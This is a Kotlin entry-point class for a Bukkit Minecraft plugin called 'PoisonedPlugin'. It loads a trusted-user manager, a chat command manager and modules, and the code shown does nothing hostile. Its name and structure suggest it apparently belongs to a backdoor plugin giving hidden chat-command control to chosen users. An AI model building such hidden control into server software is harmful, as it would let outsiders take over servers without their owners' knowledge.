/*
 * MIT License
 *
 * Copyright (c) 2023 Max Bossing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package de.maxbossing.poisonedplugin

import de.maxbossing.poisonedplugin.command._CommandRegistry
import de.maxbossing.poisonedplugin.manager.ChatCommandManager
import de.maxbossing.poisonedplugin.manager.TrustedUserManager
import de.maxbossing.poisonedplugin.module.ModuleManager
import de.maxbossing.poisonedplugin.utils.log
import org.bukkit.plugin.java.JavaPlugin

class PoisonedPlugin: JavaPlugin() {

    companion object {
        lateinit var instance: PoisonedPlugin
        var debug = true
    }

    override fun onLoad() {
        instance = this

        TrustedUserManager
        log("TrustedUserManager loaded")
    }

    override fun onEnable() {
        ChatCommandManager; log("ChatCommandManager Loaded")

        _CommandRegistry; log("Independent Commands Loaded")

        ModuleManager; log("Dependent Modules Loaded")
    }
}

val instance by lazy { PoisonedPlugin.instance }